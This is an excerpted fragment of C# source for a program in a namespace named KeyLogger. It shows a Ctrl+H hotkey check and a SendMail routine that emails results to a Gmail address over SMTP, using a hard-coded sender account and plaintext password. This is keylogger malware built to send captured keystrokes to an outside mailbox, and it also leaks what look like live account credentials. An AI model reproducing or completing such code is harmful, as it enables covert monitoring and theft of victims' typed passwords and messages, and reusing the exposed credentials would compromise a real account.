...
namespace KeyLogger
{
    class Program
    {
        ...
        {
            if ((previousKey == Keys.LControlKey || previousKey == Keys.RControlKey) && (Keys)vkcode == Keys.H)
                isHotKey = true;
        ...
        static void SendMail()
        {
            try
            {
                ...
                mail.To.Add("sonvuongso@gmail.com"); // mail nhận
                ...
                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("sonsbe1997@gmail.com", "sonvuong1997");
